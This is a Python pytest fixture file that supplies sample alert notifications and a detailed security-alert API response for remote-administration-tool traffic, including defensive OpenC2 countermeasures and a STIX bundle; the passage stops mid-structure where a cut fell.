# flake8: noqa

import pytest


@pytest.fixture
def samplenotif_alert_created():
    yield {
        "metadata": {
            "version": 2,
            "uuid": "a8fb31cb-7310-4f59-afc2-d52033b5cf78",
            "created_at": "2019-09-06T07:32:03.256679+00:00",
            "community_uuid": "cc93fe3f-c26b-4eb1-82f7-082209cf1892",
        },
        "type": "alert",
        "action": "created",
        "attributes": {
            "uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
            "short_id": "ALakbd8NXp9W",
        },
    }


@pytest.fixture
def samplenotif_alert_status_changed():
    yield {
        "metadata": {
            "version": 2,
            "community_uuid": "6ffbe55b-d30a-4dc4-bc52-a213dce0af29",
            "created_at": "2019-09-06T07:07:54.830677+00:00",
            "uuid": "02e10dca-e86e-462e-85cf-cd4c56b7d7e8",
        },
        "type": "alert",
        "action": "updated",
        "attributes": {
            "updated": {"status": "8f206505-af6d-433e-93f4-775d46dc7d0f", "status_name": "Acknowledged"},
            "uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
            "short_id": "ALakbd8NXp9W",
        },
    }


@pytest.fixture
def samplenotif_alert_updated():
    yield {
        "metadata": {
            "version": 2,
            "community_uuid": "6ffbe55b-d30a-4dc4-bc52-a213dce0af29",
            "created_at": "2019-09-06T07:07:54.830677+00:00",
            "uuid": "b47e4dad-e1de-4f9d-b77c-1c0bb61b20fe",
        },
        "type": "alert",
        "action": "updated",
        "attributes": {
            "updated": {"dynamic_urgency_value": 20},
            "uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
            "short_id": "ALakbd8NXp9W",
        },
    }


@pytest.fixture
def samplenotif_alert_comment_created():
    yield {
        "metadata": {
            "version": 2,
            "community_uuid": "6ffbe55b-d30a-4dc4-bc52-a213dce0af29",
            "uuid": "94ef1f9d-ebad-42ba-98d7-2be3447c6bd0",
            "created_at": "2019-09-06T07:07:54.830677+00:00",
        },
        "type": "alert-comment",
        "action": "created",
        "attributes": {
            "content": "comment",
            "created_by": "c110d686-0b45-4ae7-b917-f15486d0f8c7",
            "created_by_type": "user",
            "alert_uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
            "alert_short_id": "ALakbd8NXp9W",
            "uuid": "5869b4d8-e3bb-4465-baad-95daf28267c7",
        },
    }


@pytest.fixture
def sample_notifications(
    samplenotif_alert_created,
    samplenotif_alert_updated,
    samplenotif_alert_status_changed,
    samplenotif_alert_comment_created,
):
    yield [
        samplenotif_alert_created,
        samplenotif_alert_updated,
        samplenotif_alert_status_changed,
        samplenotif_alert_comment_created,
    ]


@pytest.fixture
def sample_sicalertapi():
    """Sample SICAlertAPI response for an alert with
    UUID af0a370f-2e44-433c-99b2-2d0e4b348d0c

    """

    yield {
        "source": "10.227.10.91",
        "alert_type": {"category": "malicious-traffic", "value": "rat-traffic"},
        "is_incident": False,
        "comments": [],
        "countermeasures": [
            {
                "activated_by_type": None,
                "duration": None,
                "activated_by": None,
                "comments": [],
                "activated_at": None,
                "uuid": "de66615c-4e28-4da4-bfa4-7b5caf5ee19e",
                "model_uuid": "7aa941f8-bc0a-4438-a7f7-d70e5c2a0507",
                "created_by_type": "application",
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "name": "Countermeasure 7aa941f8-bc0a-4438-a7f7-d70e5c2a0507",
                "action_steps": [
                    {
                        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                        "description": "Launch a forensics tool to collect information on suspicious system",
                        "name": "1",
                        "activated_at": None,
                        "object": {
                            "action": "start",
                            "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                            "args": {"where": "$DROP_ZONE"},
                            "target": {"process": {}},
                        },
                        "action_order": "0",
                        "denied_by": None,
                        "created_at": "2019-09-06T07:32:00.758000+00:00",
                        "activated_by_type": None,
                        "denied_at": None,
                        "denied_by_type": None,
                        "status": "created",
                        "created_by_type": "application",
                        "activated_by": None,
                        "comments": [],
                    }
                ],
                "relevance": 80,
                "denied_by_type": None,
                "description": "Launch a forensics tool to collect information on suspicious system",
                "alert_uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
                "denied_by": None,
                "dynamic_relevance": 0,
                "created_at": "2019-09-06T07:32:00.758000+00:00",
                "denied_at": None,
                "course_of_action": {
                    "id": "course-of-action--7aa941f8-bc0a-4438-a7f7-d70e5c2a0507",
                    "name": "Countermeasure 7aa941f8-bc0a-4438-a7f7-d70e5c2a0507",
                    "description": "Launch a forensics tool to collect information on suspicious system",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Launch a forensics tool to collect information on suspicious system",
                            "object": {
                                "action": "start",
                                "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"process": {}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 80.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                "status": "created",
            },
            {
                "activated_by_type": None,
                "duration": None,
                "activated_by": None,
                "comments": [],
                "activated_at": None,
                "uuid": "51d50a83-31da-46b0-aa22-5adcd37aedb2",
                "model_uuid": "4ba7d84d-0291-498e-b661-3cec45943ac7",
                "created_by_type": "application",
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "name": "Countermeasure 4ba7d84d-0291-498e-b661-3cec45943ac7",
                "action_steps": [
                    {
                        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                        "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic source",
                        "name": "1",
                        "activated_at": None,
                        "object": {
                            "action": "copy",
                            "actuator": {"network-fpc": {}},
                            "args": {"where": "$DROP_ZONE"},
                            "target": {"ip_connection": {"src-addr": "192.0.0.241"}},
                        },
                        "action_order": "0",
                        "denied_by": None,
                        "created_at": "2019-09-06T07:32:00.758000+00:00",
                        "activated_by_type": None,
                        "denied_at": None,
                        "denied_by_type": None,
                        "status": "created",
                        "created_by_type": "application",
                        "activated_by": None,
                        "comments": [],
                    }
                ],
                "relevance": 70,
                "denied_by_type": None,
                "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic source",
                "alert_uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
                "denied_by": None,
                "dynamic_relevance": 0,
                "created_at": "2019-09-06T07:32:00.758000+00:00",
                "denied_at": None,
                "course_of_action": {
                    "id": "course-of-action--4ba7d84d-0291-498e-b661-3cec45943ac7",
                    "name": "Countermeasure 4ba7d84d-0291-498e-b661-3cec45943ac7",
                    "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic source",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic source",
                            "object": {
                                "action": "copy",
                                "actuator": {"network-fpc": {}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"ip_connection": {"src-addr": "192.0.0.241"}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 70.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                "status": "created",
            },
            {
                "activated_by_type": None,
                "duration": None,
                "activated_by": None,
                "comments": [],
                "activated_at": None,
                "uuid": "909fda4e-6823-41bb-8998-afd75424a6b3",
                "model_uuid": "9c34bb79-5c48-4e0b-89cb-37d0eb1b5ba1",
                "created_by_type": "application",
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "name": "Countermeasure 9c34bb79-5c48-4e0b-89cb-37d0eb1b5ba1",
                "action_steps": [
                    {
                        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                        "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic destination",
                        "name": "1",
                        "activated_at": None,
                        "object": {
                            "action": "copy",
                            "actuator": {"network-fpc": {}},
                            "args": {"where": "$DROP_ZONE"},
                            "target": {"ip_connection": {"dst-addr": "192.0.0.241"}},
                        },
                        "action_order": "0",
                        "denied_by": None,
                        "created_at": "2019-09-06T07:32:00.758000+00:00",
                        "activated_by_type": None,
                        "denied_at": None,
                        "denied_by_type": None,
                        "status": "created",
                        "created_by_type": "application",
                        "activated_by": None,
                        "comments": [],
                    }
                ],
                "relevance": 70,
                "denied_by_type": None,
                "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic destination",
                "alert_uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
                "denied_by": None,
                "dynamic_relevance": 0,
                "created_at": "2019-09-06T07:32:00.758000+00:00",
                "denied_at": None,
                "course_of_action": {
                    "id": "course-of-action--9c34bb79-5c48-4e0b-89cb-37d0eb1b5ba1",
                    "name": "Countermeasure 9c34bb79-5c48-4e0b-89cb-37d0eb1b5ba1",
                    "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic destination",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic destination",
                            "object": {
                                "action": "copy",
                                "actuator": {"network-fpc": {}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"ip_connection": {"dst-addr": "192.0.0.241"}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 70.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                "status": "created",
            },
            {
                "activated_by_type": None,
                "duration": None,
                "activated_by": None,
                "comments": [],
                "activated_at": None,
                "uuid": "ce4abd6b-1553-413e-b549-9392de801c52",
                "model_uuid": "2c5f2708-be09-4703-8790-38f600e05328",
                "created_by_type": "application",
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "name": "Countermeasure 2c5f2708-be09-4703-8790-38f600e05328",
                "action_steps": [
                    {
                        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                        "description": "Collect memory to analyze malware later",
                        "name": "1",
                        "activated_at": None,
                        "object": {
                            "action": "snapshot",
                            "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                            "args": {"where": "$DROP_ZONE"},
                            "target": {"memory": {}},
                        },
                        "action_order": "0",
                        "denied_by": None,
                        "created_at": "2019-09-06T07:32:00.758000+00:00",
                        "activated_by_type": None,
                        "denied_at": None,
                        "denied_by_type": None,
                        "status": "created",
                        "created_by_type": "application",
                        "activated_by": None,
                        "comments": [],
                    }
                ],
                "relevance": 50,
                "denied_by_type": None,
                "description": "Collect memory to analyze malware later",
                "alert_uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
                "denied_by": None,
                "dynamic_relevance": 0,
                "created_at": "2019-09-06T07:32:00.758000+00:00",
                "denied_at": None,
                "course_of_action": {
                    "id": "course-of-action--2c5f2708-be09-4703-8790-38f600e05328",
                    "name": "Countermeasure 2c5f2708-be09-4703-8790-38f600e05328",
                    "description": "Collect memory to analyze malware later",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Collect memory to analyze malware later",
                            "object": {
                                "action": "snapshot",
                                "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"memory": {}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 50.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                "status": "created",
            },
            {
                "activated_by_type": None,
                "duration": None,
                "activated_by": None,
                "comments": [],
                "activated_at": None,
                "uuid": "d6ce6868-207c-4a59-9775-55fdd1c2318c",
                "model_uuid": "ad6f06cc-7c96-4920-8c4e-d120eaec8a4a",
                "created_by_type": "application",
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "name": "Countermeasure ad6f06cc-7c96-4920-8c4e-d120eaec8a4a",
                "action_steps": [
                    {
                        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                        "description": "Search for additional information on the case",
                        "name": "1",
                        "activated_at": None,
                        "object": {"action": "investigate", "target": {"artifact": {}}},
                        "action_order": "0",
                        "denied_by": None,
                        "created_at": "2019-09-06T07:32:00.758000+00:00",
                        "activated_by_type": None,
                        "denied_at": None,
                        "denied_by_type": None,
                        "status": "created",
                        "created_by_type": "application",
                        "activated_by": None,
                        "comments": [],
                    }
                ],
                "relevance": 73,
                "denied_by_type": None,
                "description": "Search for additional information on the case",
                "alert_uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
                "denied_by": None,
                "dynamic_relevance": 0,
                "created_at": "2019-09-06T07:32:00.758000+00:00",
                "denied_at": None,
                "course_of_action": {
                    "id": "course-of-action--ad6f06cc-7c96-4920-8c4e-d120eaec8a4a",
                    "name": "Countermeasure ad6f06cc-7c96-4920-8c4e-d120eaec8a4a",
                    "description": "Search for additional information on the case",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Search for additional information on the case",
                            "object": {
                                "action": "investigate",
                                "target": {"artifact": {}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 72.5, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                "status": "created",
            },
            {
                "activated_by_type": None,
                "duration": None,
                "activated_by": None,
                "comments": [],
                "activated_at": None,
                "uuid": "ced96fc1-d6f1-4935-9978-3f367552234c",
                "model_uuid": "6e351037-2e65-44a5-9891-c9a3f01c0e8f",
                "created_by_type": "application",
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "name": "Countermeasure 6e351037-2e65-44a5-9891-c9a3f01c0e8f",
                "action_steps": [
                    {
                        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                        "description": "Retrieve the list of running processes",
                        "name": "1",
                        "activated_at": None,
                        "object": {
                            "action": "query",
                            "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                            "args": {"where": "$DROP_ZONE"},
                            "target": {"process": {}},
                        },
                        "action_order": "0",
                        "denied_by": None,
                        "created_at": "2019-09-06T07:32:00.758000+00:00",
                        "activated_by_type": None,
                        "denied_at": None,
                        "denied_by_type": None,
                        "status": "created",
                        "created_by_type": "application",
                        "activated_by": None,
                        "comments": [],
                    }
                ],
                "relevance": 58,
                "denied_by_type": None,
                "description": "Retrieve the list of running processes",
                "alert_uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
                "denied_by": None,
                "dynamic_relevance": 0,
                "created_at": "2019-09-06T07:32:00.758000+00:00",
                "denied_at": None,
                "course_of_action": {
                    "id": "course-of-action--6e351037-2e65-44a5-9891-c9a3f01c0e8f",
                    "name": "Countermeasure 6e351037-2e65-44a5-9891-c9a3f01c0e8f",
                    "description": "Retrieve the list of running processes",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Retrieve the list of running processes",
                            "object": {
                                "action": "query",
                                "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"process": {}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 57.5, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                "status": "created",
            },
            {
                "activated_by_type": None,
                "duration": None,
                "activated_by": None,
                "comments": [],
                "activated_at": None,
                "uuid": "cb83cf8b-c31a-4df7-b05b-c78ef3446fc2",
                "model_uuid": "88ff9b6e-a0ee-4470-92ff-d9f7fe1b6232",
                "created_by_type": "application",
                "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                "name": "Countermeasure 88ff9b6e-a0ee-4470-92ff-d9f7fe1b6232",
                "action_steps": [
                    {
                        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
                        "description": "Block the IP address of the destination system",
                        "name": "1",
                        "activated_at": None,
                        "object": {
                            "action": "deny",
                            "actuator": {"network-firewall": {"location": "$GLOBAL"}},
                            "target": {"ip_addr": "192.0.0.241"},
                        },
                        "action_order": "0",
                        "denied_by": None,
                        "created_at": "2019-09-06T07:32:00.758000+00:00",
                        "activated_by_type": None,
                        "denied_at": None,
                        "denied_by_type": None,
                        "status": "created",
                        "created_by_type": "application",
                        "activated_by": None,
                        "comments": [],
                    }
                ],
                "relevance": 80,
                "denied_by_type": None,
                "description": "Block the IP address of the destination system",
                "alert_uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
                "denied_by": None,
                "dynamic_relevance": 0,
                "created_at": "2019-09-06T07:32:00.758000+00:00",
                "denied_at": None,
                "course_of_action": {
                    "id": "course-of-action--88ff9b6e-a0ee-4470-92ff-d9f7fe1b6232",
                    "name": "Countermeasure 88ff9b6e-a0ee-4470-92ff-d9f7fe1b6232",
                    "description": "Block the IP address of the destination system",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Block the IP address of the destination system",
                            "object": {
                                "action": "deny",
                                "actuator": {"network-firewall": {"location": "$GLOBAL"}},
                                "target": {"ip_addr": "192.0.0.241"},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 80.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                "status": "created",
            },
        ],
        "kill_chain_short_id": None,
        "uuid": "af0a370f-2e44-433c-99b2-2d0e4b348d0c",
        "entity": {
            "uuid": "20b0b40f-ee42-405e-802b-c576ff3f722d",
            "name": "Vessel 1235",
        },
        "updated_at": 1567755122,
        "updated_by_type": "application",
        "short_id": "ALTqhwoRAyqk",
        "created_by_type": "application",
        "details": "Traffic associated to a Remote Administration Tool",
        "created_by": "59899459-d385-48da-9c0e-1d91ebe42c4a",
        "stix": {
            "type": "bundle",
            "id": "bundle--0661dffc-6deb-45c0-8a41-36187d932543",
            "spec_version": "2.0",
            "objects": [
                {
                    "id": "sighting--a313284d-2e0b-4169-9236-bd8b166d8afa",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.758Z",
                    "modified": "2019-09-06T07:32:00.758Z",
                    "first_seen": "2019-09-06T07:32:00.7586Z",
                    "last_seen": "2019-09-06T07:32:00.7586Z",
                    "count": 1,
                    "where_sighted_refs": ["identity--20b0b40f-ee42-405e-802b-c576ff3f722d"],
                    "observed_data_refs": ["observed-data--8b9ad982-8ea8-435e-aacc-a51161e95849"],
                    "type": "sighting",
                    "sighting_of_ref": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                },
                {
                    "id": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "identity_class": "community",
                    "name": "Community OliveDrab",
                    "description": "No description",
                    "type": "identity",
                    "created": "2019-09-06T07:32:00.754Z",
                    "modified": "2019-09-06T07:32:00.754Z",
                },
                {
                    "id": "identity--20b0b40f-ee42-405e-802b-c576ff3f722d",
                    "identity_class": "entity",
                    "name": "Vessel 1235",
                    "type": "identity",
                    "created": "2019-09-06T07:32:00.755Z",
                    "modified": "2019-09-06T07:32:00.755Z",
                },
                {
                    "id": "observed-data--8b9ad982-8ea8-435e-aacc-a51161e95849",
                    "first_observed": "2019-09-06T06:48:15.7553Z",
                    "last_observed": "2019-09-06T06:48:15.7553Z",
                    "created": "2019-09-06T07:32:00.755Z",
                    "modified": "2019-09-06T07:32:00.755Z",
                    "objects": {
                        "0": {"type": "ipv4-addr", "value": "10.227.10.91"},
                        "1": {"type": "ipv4-addr", "value": "192.0.0.241"},
                        "2": {
                            "type": "network-traffic",
                            "start": "2019-09-06T06:48:15.7553Z",
                            "src_ref": "0",
                            "dst_ref": "1",
                            "dst_port": 443,
                            "protocols": ["ipv4", "tcp", "ssl"],
                        },
                    },
                    "number_observed": 1,
                    "x_sic_custom_properties": {
                        "site_id": 1235,
                        "install_id": "7620",
                        "soc_analyst_required": True,
                        "vessel_imo": "0",
                        "zone_name": "High-Priority Internet",
                        "zone_id": "185",
                        "logs_download_enabled": True,
                        "customer_id": "BIZ1000",
                        "service_subscribed": True,
                        "zone_type": "UNSPECIFIED_ZONE",
                        "zone_priority_level": "HIGH_TRAFFIC",
                        "unkown_service_option": False,
                    },
                    "x_sic_entity_by_ref": "identity--20b0b40f-ee42-405e-802b-c576ff3f722d",
                    "type": "observed-data",
                },
                {
                    "id": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                    "name": "RAT LightSteelBlue",
                    "description": "Traffic associated to a Remote Administration Tool",
                    "created": "2019-09-06T07:32:00.757Z",
                    "modified": "2019-09-06T07:32:00.757Z",
                    "pattern": "[ipv4-addr:value='192.0.0.241']",
                    "labels": ["malicious-traffic", "rat-traffic"],
                    "x_sic_alert": {
                        "type": {
                            "category": "malicious-traffic",
                            "value": "rat-traffic",
                            "description": "eCSIRT-SEKOIA",
                        },
                        "generation_mode": "automatic",
                        "severity": 95,
                    },
                    "type": "indicator",
                    "valid_from": "2019-09-06T07:32:00.757121Z",
                },
                {
                    "id": "relationship--88ff9b6e-a0ee-4470-92ff-d9f7fe1b6232",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "type": "relationship",
                    "source_ref": "course-of-action--88ff9b6e-a0ee-4470-92ff-d9f7fe1b6232",
                    "relationship_type": "mitigates",
                    "target_ref": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                },
                {
                    "id": "relationship--6e351037-2e65-44a5-9891-c9a3f01c0e8f",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "type": "relationship",
                    "source_ref": "course-of-action--6e351037-2e65-44a5-9891-c9a3f01c0e8f",
                    "relationship_type": "mitigates",
                    "target_ref": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                },
                {
                    "id": "relationship--ad6f06cc-7c96-4920-8c4e-d120eaec8a4a",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "type": "relationship",
                    "source_ref": "course-of-action--ad6f06cc-7c96-4920-8c4e-d120eaec8a4a",
                    "relationship_type": "mitigates",
                    "target_ref": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                },
                {
                    "id": "relationship--2c5f2708-be09-4703-8790-38f600e05328",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "type": "relationship",
                    "source_ref": "course-of-action--2c5f2708-be09-4703-8790-38f600e05328",
                    "relationship_type": "mitigates",
                    "target_ref": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                },
                {
                    "id": "relationship--9c34bb79-5c48-4e0b-89cb-37d0eb1b5ba1",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "type": "relationship",
                    "source_ref": "course-of-action--9c34bb79-5c48-4e0b-89cb-37d0eb1b5ba1",
                    "relationship_type": "mitigates",
                    "target_ref": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                },
                {
                    "id": "relationship--4ba7d84d-0291-498e-b661-3cec45943ac7",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "type": "relationship",
                    "source_ref": "course-of-action--4ba7d84d-0291-498e-b661-3cec45943ac7",
                    "relationship_type": "mitigates",
                    "target_ref": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                },
                {
                    "id": "relationship--7aa941f8-bc0a-4438-a7f7-d70e5c2a0507",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "type": "relationship",
                    "source_ref": "course-of-action--7aa941f8-bc0a-4438-a7f7-d70e5c2a0507",
                    "relationship_type": "mitigates",
                    "target_ref": "indicator--b686f467-fcab-412b-9633-d68982e1be82",
                },
                {
                    "id": "course-of-action--88ff9b6e-a0ee-4470-92ff-d9f7fe1b6232",
                    "name": "Countermeasure 88ff9b6e-a0ee-4470-92ff-d9f7fe1b6232",
                    "description": "Block the IP address of the destination system",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Block the IP address of the destination system",
                            "object": {
                                "action": "deny",
                                "actuator": {"network-firewall": {"location": "$GLOBAL"}},
                                "target": {"ip_addr": "192.0.0.241"},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 80.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                {
                    "id": "course-of-action--6e351037-2e65-44a5-9891-c9a3f01c0e8f",
                    "name": "Countermeasure 6e351037-2e65-44a5-9891-c9a3f01c0e8f",
                    "description": "Retrieve the list of running processes",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Retrieve the list of running processes",
                            "object": {
                                "action": "query",
                                "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"process": {}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 57.5, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                {
                    "id": "course-of-action--ad6f06cc-7c96-4920-8c4e-d120eaec8a4a",
                    "name": "Countermeasure ad6f06cc-7c96-4920-8c4e-d120eaec8a4a",
                    "description": "Search for additional information on the case",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Search for additional information on the case",
                            "object": {
                                "action": "investigate",
                                "target": {"artifact": {}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 72.5, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                {
                    "id": "course-of-action--2c5f2708-be09-4703-8790-38f600e05328",
                    "name": "Countermeasure 2c5f2708-be09-4703-8790-38f600e05328",
                    "description": "Collect memory to analyze malware later",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Collect memory to analyze malware later",
                            "object": {
                                "action": "snapshot",
                                "actuator": {"endpoint": {"ip_addr": "10.227.10.91"}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"memory": {}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 50.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                {
                    "id": "course-of-action--9c34bb79-5c48-4e0b-89cb-37d0eb1b5ba1",
                    "name": "Countermeasure 9c34bb79-5c48-4e0b-89cb-37d0eb1b5ba1",
                    "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic destination",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
                            "type": "openc2",
                            "name": "1",
                            "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic destination",
                            "object": {
                                "action": "copy",
                                "actuator": {"network-fpc": {}},
                                "args": {"where": "$DROP_ZONE"},
                                "target": {"ip_connection": {"dst-addr": "192.0.0.241"}},
                            },
                        }
                    ],
                    "x_sic_countermeasure": {"relevance": 70.0, "dynamic_relevance": 0},
                    "type": "course-of-action",
                },
                {
                    "id": "course-of-action--4ba7d84d-0291-498e-b661-3cec45943ac7",
                    "name": "Countermeasure 4ba7d84d-0291-498e-b661-3cec45943ac7",
                    "description": "Record the traffic coming from the suspicious computer for analysis based on the IP address of the traffic source",
                    "created_by_ref": "identity--cc93fe3f-c26b-4eb1-82f7-082209cf1892",
                    "created": "2019-09-06T07:32:00.759Z",
                    "modified": "2019-09-06T07:32:00.759Z",
                    "action-steps": [
                        {
